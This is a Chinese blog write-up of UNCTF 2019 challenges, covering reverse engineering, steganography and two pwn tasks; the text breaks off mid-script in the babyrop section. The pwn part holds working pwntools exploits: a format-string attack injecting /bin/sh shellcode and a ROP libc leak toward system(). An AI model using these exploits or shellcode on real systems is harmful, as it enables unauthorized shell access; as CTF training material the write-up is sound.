<!DOCTYPE html><html><head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="utf-8">
  

  
  <title>UNCTF-WP | Du4t的博客</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="逆向BabyXor                                                 有壳 且没有检测出具体壳的种类 使用ESP定律手动脱壳   已经脱掉壳了 载入dbg动态调试 单步跟几部之后发现在栈中存有flag                                                  得到flag{2378b077-7d6e-4564-b">
<meta name="keywords" content="WP">
<meta property="og:type" content="article">
<meta property="og:title" content="UNCTF-WP">
<meta property="og:url" content="http://Du4t.github.io/2019/10/26/unctf-wp/index.html">
<meta property="og:site_name" content="Du4t的博客">
<meta property="og:description" content="逆向BabyXor                                                 有壳 且没有检测出具体壳的种类 使用ESP定律手动脱壳   已经脱掉壳了 载入dbg动态调试 单步跟几部之后发现在栈中存有flag                                                  得到flag{2378b077-7d6e-4564-b">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="https://ae01.alicdn.com/kf/H177f67923b764acd81d41f273e48f59bR.png">
<meta property="og:image" content="https://ae01.alicdn.com/kf/H385b1b23dcc94510bdadae87f250ec19m.png">
<meta property="og:image" content="https://ae01.alicdn.com/kf/H951b18e9b2884ed586e617c995e78402r.png">
<meta property="og:image" content="https://ae01.alicdn.com/kf/H2be8210dda1a4d9cbbb77b0c674efdcam.png">
<meta property="og:image" content="https://ae01.alicdn.com/kf/He8a1df62631d402290b70f623bf887f0p.png">
<meta property="og:image" content="https://ae01.alicdn.com/kf/Hfc2b5deb6260419db18bf6bee9ab746cJ.png">
<meta property="og:image" content="https://ae01.alicdn.com/kf/H527c4d5522d14ffb99fff951ccf981b1j.png">
<meta property="og:image" content="https://ae01.alicdn.com/kf/H16a308588307444e99589e8d835d5845l.png">
<meta property="og:image" content="https://ae01.alicdn.com/kf/Ha6b282e91d8346fb9ffb4d6744471271Z.png">
<meta property="og:image" content="https://ae01.alicdn.com/kf/H5dddc8800dcb4418b5c19e68e57f0217H.png">
<meta property="og:image" content="https://ae01.alicdn.com/kf/H0010bde43e734b52988cc085af9b232eI.png">
<meta property="og:image" content="https://ae01.alicdn.com/kf/H579884a3afc84b6b9ca56c6e424a3cd2E.png">
<meta property="og:image" content="https://ae01.alicdn.com/kf/H98899544adbe44dfa49cc7f2f25d6efcR.png">
<meta property="og:image" content="https://ae01.alicdn.com/kf/Hbdacf6fb10b94692b0042ab46eae90b6j.png">
<meta property="og:image" content="https://ae01.alicdn.com/kf/H3957789159424e6892be90a5e079cf93O.png">
<meta property="og:image" content="https://ae01.alicdn.com/kf/H99778f2de6394b0b975fdca9696afc871.png">
<meta property="og:image" content="https://ae01.alicdn.com/kf/Hb41cabac09d74679a4b9f43f79d07c8fP.png">
<meta property="og:image" content="https://ae01.alicdn.com/kf/Hfcf3459d32234459bd9038bcdf09e3d6l.png">
<meta property="og:image" content="https://ae01.alicdn.com/kf/He66d3dd1538c43ce965aa031d0f91118b.png">
<meta property="og:image" content="https://ae01.alicdn.com/kf/H9561966502154d29a2a15780b7e4b423A.png">
<meta property="og:image" content="https://ae01.alicdn.com/kf/Heaab253259f0480dbd38315db946809c9.png">
<meta property="og:image" content="https://ae01.alicdn.com/kf/Hbfd015f0da7241359c15efc52abdca27h.png">
<meta property="og:image" content="https://ae01.alicdn.com/kf/H3c110809807e4b1f9e8ada15e9586729D.png">
<meta property="og:image" content="https://ae01.alicdn.com/kf/H50a0b71b04ff42638c5cbad83611bed9W.png">
<meta property="og:image" content="https://ae01.alicdn.com/kf/H40e854236162467fadefc95cc93de3ede.png">
<meta property="og:updated_time" content="2019-11-16T08:09:40.703Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="UNCTF-WP">
<meta name="twitter:description" content="逆向BabyXor                                                 有壳 且没有检测出具体壳的种类 使用ESP定律手动脱壳   已经脱掉壳了 载入dbg动态调试 单步跟几部之后发现在栈中存有flag                                                  得到flag{2378b077-7d6e-4564-b">
<meta name="twitter:image" content="https://ae01.alicdn.com/kf/H177f67923b764acd81d41f273e48f59bR.png">
  
    <link rel="alternate" href="/atom.xml" title="Du4t的博客" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
  <link rel="stylesheet" href="/css/style.css">
<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
<body>

  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Du4t的博客</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">Du4t~~~~</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit"></button><input type="hidden" name="sitesearch" value="http://Du4t.github.io"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-UNCTF-WP" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/10/26/unctf-wp/" class="article-date">
  <time datetime="2019-10-26T08:54:39.000Z" itemprop="datePublished">2019-10-26</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/WP/">WP</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      UNCTF-WP
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <meta name="generator" content="Hexo 3.9.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"><h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><h3 id="BabyXor"><a href="#BabyXor" class="headerlink" title="BabyXor"></a>BabyXor</h3><figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/H177f67923b764acd81d41f273e48f59bR.png" alt title class>
                <p></p>
            </figure>

<p>有壳 且没有检测出具体壳的种类 使用ESP定律手动脱壳 </p>
<p><img src="https://ae01.alicdn.com/kf/H385b1b23dcc94510bdadae87f250ec19m.png" alt></p>
<p>已经脱掉壳了 载入dbg动态调试 单步跟几部之后发现在栈中存有flag</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/H951b18e9b2884ed586e617c995e78402r.png" alt title class>
                <p></p>
            </figure>

<p>得到flag{2378b077-7d6e-4564-bdca-7eec8eede9a2}</p>
<h3 id="666"><a href="#666" class="headerlink" title="666"></a>666</h3><p>拖入IDA 看算法 在encode函数内发现主要算法 </p>
<p><img src="https://ae01.alicdn.com/kf/H2be8210dda1a4d9cbbb77b0c674efdcam.png" alt></p>
<p>同时在主函数结尾发现strcmp函数 推测是比较加密后的flag</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/He8a1df62631d402290b70f623bf887f0p.png" alt title class>
                <p></p>
            </figure>

<p>写出逆算法即可</p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><iostream></span></span>
using namespace std<span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span><span class="token comment" spellcheck="true">//iN."K.v"w""zorhwzi</span>
    <span class="token keyword">char</span> a1<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> a2<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> v3<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> v4<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> v5<span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> key<span class="token operator">=</span><span class="token number">0x12</span><span class="token punctuation">;</span>
    cin<span class="token operator">>></span>a2<span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator"><</span>key<span class="token punctuation">;</span>i<span class="token operator">+</span><span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        v5<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>a2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        v4<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>a2<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        v3<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span>a2<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span>v5<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span>key<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">;</span>
        a1<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span>v4<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">^</span>key<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">;</span>
        a1<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span>v3<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">^</span>key<span class="token operator">^</span><span class="token number">6</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    cout<span class="token operator"><<</span>a1<span class="token punctuation">;</span>
 <span class="token punctuation">}</span> </code></pre>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/Hfc2b5deb6260419db18bf6bee9ab746cJ.png" alt title class>
                <p></p>
            </figure>

<p>得到flag:unctf{b66_6b6_66b}</p>
<h3 id="unctf-easy-Maze"><a href="#unctf-easy-Maze" class="headerlink" title="unctf_easy_Maze"></a>unctf_easy_Maze</h3><p>从名字中就可以推测出是迷宫题 下载附件 拖进IDA</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/H527c4d5522d14ffb99fff951ccf981b1j.png" alt title class>
                <p></p>
            </figure>

<p>v9数组明显是最初始在定义数组 原本是一个个的变量 通过手动修正可以让IDA识别成为数组 步入Step0和Step1两个函数 发现是分别对原本的迷宫进行变换 而Step2函数则是接受输入 进入走迷宫的环节 在尝试下写逆算法后选择放弃 决定使用动态调试 在Step2函数前下断 找到变换完成后的迷宫即可 </p>
<blockquote>
</blockquote>
<p>第一次变换后迷宫</p>
<p>ff ff ff ff 00 00 00 00 ff ff ff ff 00 00 00 00</p>
<p>01 00 00 00 02 00 00 00 00 00 00 00 01 00 00 00</p>
<p>ff ff ff ff 00 00 00 00 ff ff ff ff 00 00 00 00</p>
<p>ff ff ff ff 01 00 00 00 ff ff ff ff 01 00 00 00</p>
<p>01 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00</p>
<p>ff ff ff ff 01 00 00 00 00 00 00 00 00 00 00 00</p>
<p>00 00 00 00 00 00 00 00 ff ff ff ff 00 00 00 00</p>
<p>ff ff ff ff 00 00 00 00 00 00 00 00 01 00 00 00</p>
<p>00 00 00 00 01 00 00 00 00 00 00 00 01 00 00 00</p>
<p>00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00</p>
<p>ff ff ff ff ff ff ff ff 01 00 00 00 00 00 00 00</p>
<p>00 00 00 00 ff ff ff ff ff ff ff ff ff ff ff ff</p>
<p>01 00 00 00                                   </p>
<p>第二次变换后的迷宫</p>
<p>01 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00</p>
<p>01 00 00 00 01 00 00 00 01 00 00 00 01 00 00 00</p>
<p>00 00 00 00 01 00 00 00 01 00 00 00 00 00 00 00</p>
<p>00 00 00 00 01 00 00 00 01 00 00 00 01 00 00 00</p>
<p>01 00 00 00 00 00 00 00 01 00 00 00 01 00 00 00</p>
<p>01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</p>
<p>01 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00</p>
<p>01 00 00 00 01 00 00 00 01 00 00 00 01 00 00 00</p>
<p>00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00</p>
<p>00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00</p>
<p>01 00 00 00 01 00 00 00 01 00 00 00 01 00 00 00</p>
<p>01 00 00 00 01 00 00 00 01 00 00 00 00 00 00 00</p>
<p>01 00 00 00   </p>
<blockquote>
</blockquote>
<p>在step2函数中得知迷宫为7*7迷宫 写出脚本输出迷宫</p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><iostream></span></span>
using namespace std<span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">char</span> mazz<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"1001111101100111101110001100111100010001111111101"</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator"><</span><span class="token number">49</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">%</span><span class="token number">7</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            cout<span class="token operator"><<</span>endl<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        cout<span class="token operator"><<</span>mazz<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>    
<span class="token punctuation">}</span></code></pre>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/H16a308588307444e99589e8d835d5845l.png" alt title class>
                <p></p>
            </figure>

<p>对照迷宫从(0,0)走到(6,6)即可 </p>
<p><img src="https://ae01.alicdn.com/kf/Ha6b282e91d8346fb9ffb4d6744471271Z.png" alt></p>
<p>得到flag:UNCTF{ssddwdwdddssaasasaaassddddwdds}</p>
<h3 id="easyvm"><a href="#easyvm" class="headerlink" title="easyvm"></a>easyvm</h3><p>这题应该我是非预期解… 没有进行算法逆向和动态调试 直接使用Python中的Angr库进行符号执行 得到flag</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/H5dddc8800dcb4418b5c19e68e57f0217H.png" alt title class>
                <p></p>
            </figure>

<p>贴出脚本</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> angr

project<span class="token operator">=</span>angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">"./vm"</span><span class="token punctuation">,</span>auto_load_libs<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
state<span class="token operator">=</span>project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>entry_state<span class="token punctuation">(</span><span class="token punctuation">)</span>
simgr<span class="token operator">=</span>project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>state<span class="token punctuation">)</span>
simgr<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span><span class="token number">0x400BDA</span><span class="token punctuation">,</span>avoid<span class="token operator">=</span><span class="token number">0x400B96</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
<h3 id="奇怪的数组"><a href="#奇怪的数组" class="headerlink" title="奇怪的数组"></a>奇怪的数组</h3><p>载入IDA 通过阅读主函数 知道flag的格式为flag{****}</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/H0010bde43e734b52988cc085af9b232eI.png" alt title class>
                <p></p>
            </figure>

<p>步入char2hex函数查看算法 发现首先是限制输入只能为 <strong>‘0’<del>‘9’&&’a’</del>‘e’</strong> 发现后面的减法运算其实就是将字符转为数值 0~15 返回到主函数 发现在关键if判断前有一个 <strong>v9=16*v11+v10</strong> 确定是十六进制运算 <em>简单举例就是A*16+D=AD</em><br>然后将得数和程序预先设计好的checkbox数组进行比较 可以得知 程序需要的输入其实就是checkbox数组的值 </p>
<p><img src="https://ae01.alicdn.com/kf/H579884a3afc84b6b9ca56c6e424a3cd2E.png" alt></p>
<p>得到flag:flag{ad461e203c7975b35e527960cbfeb06c}</p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="快乐游戏题"><a href="#快乐游戏题" class="headerlink" title="快乐游戏题"></a>快乐游戏题</h3><p>玩就完事了= =</p>
<h3 id="信号不好我先挂了"><a href="#信号不好我先挂了" class="headerlink" title="信号不好我先挂了"></a>信号不好我先挂了</h3><p>下载附件 载入Stegsolve发现存在图片隐写 且隐写数据为504B0304开头 怀疑是压缩包 直接保存成ZIP </p>
<p><img src="https://ae01.alicdn.com/kf/H98899544adbe44dfa49cc7f2f25d6efcR.png" alt></p>
<p>得到一个长得和原图一模一样的图片 使用十六进制编辑器和Stegsolve都没有发现线索 在百度过后怀疑是隐水印 使用工具BlindWaterMark尝试破解 得到flag</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/Hbdacf6fb10b94692b0042ab46eae90b6j.png" alt title class>
                <p></p>
            </figure>

<h3 id="Think"><a href="#Think" class="headerlink" title="Think"></a>Think</h3><p>下载附件 发现是个Python脚本 运行后输出一句</p>
<blockquote>
</blockquote>
<p>It’s a simple question. Take it easy. Don’t think too much about it.</p>
<blockquote>
</blockquote>
<p>猜测可能直接就是2019unctf 粗略阅读下代码 发现后面有base64decode 怀疑是经过base64加密后的”2019unctf” 加密后尝试 得到flag</p>
<p>flag:flag{34a94868a8ad9ff82baadb326c513d40}</p>
<h3 id="亲爱的"><a href="#亲爱的" class="headerlink" title="亲爱的"></a>亲爱的</h3><p>这真的不是社工题么… 下载后发现是mp3 音频分析后没有线索 尝试使用16进制编辑器查看 发现文件最后存有一个压缩包 </p>
<p><img src="https://ae01.alicdn.com/kf/H3957789159424e6892be90a5e079cf93O.png" alt></p>
<p>直接修改后缀 发现压缩包需要密码  尝试爆破无果 发现压缩包备注 “qmusic 2019.7.27 17:47” 在QQ音乐上的同歌曲下的评论区寻找对应评论 得到密码 “真的上头” 解压出来一张图片 拖入十六进制编辑器 发现存在压缩包</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/H99778f2de6394b0b975fdca9696afc871.png" alt title class>
                <p></p>
            </figure>

<p>直接修改后缀 在压缩包 /Word/media/ 路径下发现flag图片</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/Hb41cabac09d74679a4b9f43f79d07c8fP.png" alt title class>
                <p></p>
            </figure>

<p>得到falg:UNCTF{W3_L0v3_Unctf}</p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="babyfmt"><a href="#babyfmt" class="headerlink" title="babyfmt"></a>babyfmt</h3><blockquote>
<p>存在漏洞:格式化字符串漏洞</p>
</blockquote>
<p>照例 下载先查保护</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/Hfcf3459d32234459bd9038bcdf09e3d6l.png" alt title class>
                <p></p>
            </figure>

<p>发现保护全关 载入IDA 发现存在格式化字符串漏洞 且输入长度不足以溢出返回地址</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/He66d3dd1538c43ce965aa031d0f91118b.png" alt title class>
                <p></p>
            </figure>

<p>那么肯定是通过写入shellcode 来实现getshell 先去找一个空白的bss段地址</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/H9561966502154d29a2a15780b7e4b423A.png" alt title class>
                <p></p>
            </figure>

<p>发现bss段地址是 0x8049b80开始的 载入IDA查看是否有读写执行权限</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/Heaab253259f0480dbd38315db946809c9.png" alt title class>
                <p></p>
            </figure>

<p>存在读写执行权限 那么接下来就是通过格式化字符串漏洞将shellcode 写入bss段地址 然后利用漏洞修改返回地址为bss段地址即可</p>
<blockquote>
<p>这里介绍一下pwntools 针对格式化字符串漏洞的模块 fmtstr_payload</p>
<p>这是一个函数 函数调用语法是 fmtstr_payload(格式化字符串的偏移,{地址:写入的值})</p>
<p>执行这个函数就能利用格式化字符串漏洞直接将值写入到指定地址上 比自己算不知道好用多少…</p>
</blockquote>
<p>那么直接给出脚本即可 当然 返回地址肯定还是需要先泄漏出来的</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

sh<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"./babyfmt"</span><span class="token punctuation">)</span>
file<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"./babyfmt"</span><span class="token punctuation">)</span>

read_addr<span class="token operator">=</span><span class="token number">0x80486cd</span>
puts_plt<span class="token operator">=</span>file<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
puts_got<span class="token operator">=</span>file<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please input your message:"</span><span class="token punctuation">)</span>
payload<span class="token operator">=</span><span class="token string">'%27$p'</span>

sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
ret_addr<span class="token operator">=</span>int<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"ret_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
buf_addr<span class="token operator">=</span>ret_addr<span class="token number">-0x5c</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"buf_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>buf_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
bss_addr<span class="token operator">=</span><span class="token number">0x8049b80</span>



shell_code<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x6850c031</span><span class="token punctuation">,</span><span class="token number">0x68732f6e</span><span class="token punctuation">,</span><span class="token number">0x622f2f68</span><span class="token punctuation">,</span><span class="token number">0x50e38969</span><span class="token punctuation">,</span><span class="token number">0x8953e289</span><span class="token punctuation">,</span><span class="token number">0xcd0bb0e1</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">]</span>
<span class="token comment" spellcheck="true"># shell_code=[0xf7e652b0,0x0148bbdc,0x5e5ee6d0,0x5ec4d248,0xc1c31848,0xd1eb5348,0x8d3c2404,0x3a0f05]</span>

<span class="token keyword">while</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>shell_code<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload<span class="token operator">=</span>fmtstr_payload<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token punctuation">(</span>bss_addr<span class="token operator">+</span>i<span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>shell_code<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please input your message:"</span><span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>



payload2<span class="token operator">=</span>fmtstr_payload<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token punctuation">{</span>ret_addr<span class="token punctuation">:</span>bss_addr<span class="token punctuation">}</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please input your message:"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>


sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<blockquote>
<p>因为这里我是本地打的 试了两份shellcode 都没有打通 感觉还是shellcode的锅 </p>
</blockquote>
<h3 id="babyrop"><a href="#babyrop" class="headerlink" title="babyrop"></a>babyrop</h3><blockquote>
<p>存在漏洞:栈溢出</p>
</blockquote>
<p>其实做下来 感觉这道题才是PWN模块的签到题…</p>
<p>其实题目已经提示 用到的知识是ROP 当然 下载附件后起码的尊敬还是要的</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/Hbfd015f0da7241359c15efc52abdca27h.png" alt title class>
                <p></p>
            </figure>

<p>然后载入IDA 发现第一个限制条件 要求v2的值是0x66666666 然后通过寄存器发现v2是存在栈上的 而且buf是可以溢出覆盖到的 那我们直接覆盖即可</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/H3c110809807e4b1f9e8ada15e9586729D.png" alt title class>
                <p></p>
            </figure>

<p>接下来跟进 sub_804853D 发现溢出点buf 通过观察栈图确定buf可以溢出到返回地址 但是问题是 这里的限制条件是返回地址不能是大于0x8050000的地址 对于执行所有Libc中的函数来说基本都是不可能的 所以我们考虑绕过方式</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/H50a0b71b04ff42638c5cbad83611bed9W.png" alt title class>
                <p></p>
            </figure>

<p>通过观察函数表我们发现puts函数的地址是小于0x8050000的 所以我们通过puts函数来泄漏Libc版本 然后返回主函数进行二次利用 在第二次利用的时候 我们将puts函数的返回地址改为system即可</p>
<p>直接给出脚本</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
sh<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"./babyrop"</span><span class="token punctuation">)</span>
file<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"./babyrop"</span><span class="token punctuation">)</span>
libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"./libc6_2.27-3ubuntu1_i386.so"</span><span class="token punctuation">)</span>
puts_plt<span class="token operator">=</span>file<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
puts_got<span class="token operator">=</span>file<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
read_addr<span class="token operator">=</span><span class="token number">0x804853d</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Hello CTFer!"</span><span class="token punctuation">)</span>
payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x66666666</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"What is your name?"</span><span class="token punctuation">)</span>
payload2<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x14</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># sh.interactive()</span>

sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>
